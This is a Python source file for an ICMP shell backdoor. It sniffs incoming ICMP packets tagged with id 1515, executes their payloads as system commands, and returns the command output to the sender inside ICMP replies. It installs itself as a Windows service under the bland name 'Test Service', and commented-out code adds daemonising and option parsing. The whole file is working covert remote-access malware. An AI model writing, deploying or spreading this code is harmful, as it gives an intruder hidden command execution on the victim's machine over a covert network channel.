import os
from multiprocessing import Process

import win32service
import win32serviceutil
from scapy.layers.inet import ICMP, IP
from scapy.sendrecv import sniff, send

import ish_open
import ishell


def packet_callback(packet):
    if ICMP in packet and packet[ICMP].type == 0 and packet[ICMP].id == 1515:
        received_data = packet[ICMP].payload.load.decode('utf-8')
        print("-----+ IN DATA +------")
        print(received_data)
        print("-----+ OUT DATA +-----")
        child_conn, process = ish_open.popen2(received_data)
        ishell.sendhdr.cntrl = 0

        process.stdin.close()

        output = process.stdout.read()
        error = process.stderr.read()

        os.close(child_conn)
        process.communicate()

        output = output.decode('cp866').strip()
        error = error.decode('cp866')
        print(output)
        print(error)
        if output == '':
            reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / error
            send(reply_packet, verbose=False)
        else:
            reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0, id=1515) / output
            send(reply_packet, verbose=False)
#
#
#def ish_listen():
#    child_conn, process = ish_open.popen2("echo Hello world!")
#    ishell.sendhdr.cntrl = 0
#
#    process.stdin.close()
#
#    output = process.stdout.read()
#    error = process.stderr.read()
#
#    os.close(child_conn)
#    process.communicate()
#
#    print(output.decode('cp866'))
#    print(error.decode('cp866'))
#
#
#def sig_handle():
#    return
#
#
#def child_process():
#    sniff(filter="icmp", prn=packet_callback)
#    try:
#        os.chdir("/")
#    except Exception as e:
#        print(f"Error changing directory: {e}")
#
#    try:
#        os.umask(0)
#    except Exception as e:
#        print(f"Error setting umask: {e}")
#
#    try:
#        with open(os.devnull, 'w') as null_file:
#            os.dup2(null_file.fileno(), sys.stdin.fileno())
#
#            os.dup2(null_file.fileno(), sys.stdout.fileno())
#
#            os.dup2(null_file.fileno(), sys.stderr.fileno())
#
#        return 0
#    except Exception:
#        return -1
#
#
#def edaemon():
#    process = multiprocessing.Process(target=child_process)
#
#    try:
#        process.start()
#        process.join()
#    except Exception:
#        sys.exit(-1)
#
#
#def send_icmp_with_data(target_ip, data):
#    packet = IP(dst=target_ip) / ICMP() / data
#    send(packet)
#
#
#def main():
#    ish_debug = 1
#
#    parser = argparse.ArgumentParser(description='ICMP Shell')
#
#    parser.add_argument('-i', help='Назначение идентификатора процесса (диапазон: 0-65535; по-умолчанию 1515)')
#    parser.add_argument('-d', help='Запуск сервера в режиме debug', action='store_true')
#    parser.add_argument('-t', help='Назначение типа пакетов ICMP (по-умолчанию 0)')
#    parser.add_argument('-p', help='Назначение размера пакета (по-умолчанию 512)')
#
#    args = parser.parse_args()
#
#    if args.i:
#        ishell.ish_info.id = args.i
#    if args.t:
#        ishell.ish_info.type = args.t
#    if args.p:
#        ishell.ish_info.packetsize = args.p
#    if args.d:
#        ish_debug = 0
#
#    if (ish_debug):
#        # if edaemon():
#        #    print("Cannot start server as daemon!")
#        #    sys.exit(-1)
#        sniff(filter="icmp", prn=packet_callback)
#
#    # sniff(filter="icmp", prn=packet_callback)


class AppServerSvc(win32serviceutil.ServiceFramework):
    _svc_name_ = "TestService"
    _svc_display_name_ = "Test Service"

    def __init__(self, *args):
        super().__init__(*args)

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        self.process.terminate()
        self.ReportServiceStatus(win32service.SERVICE_STOPPED)

    def SvcDoRun(self):
        self.process = Process(target=self.main)
        self.process.start()
        self.process.run()

    def main(self):
        sniff(filter="icmp", prn=packet_callback)


if __name__ == '__main__':
    # main()
    win32serviceutil.HandleCommandLine(AppServerSvc)
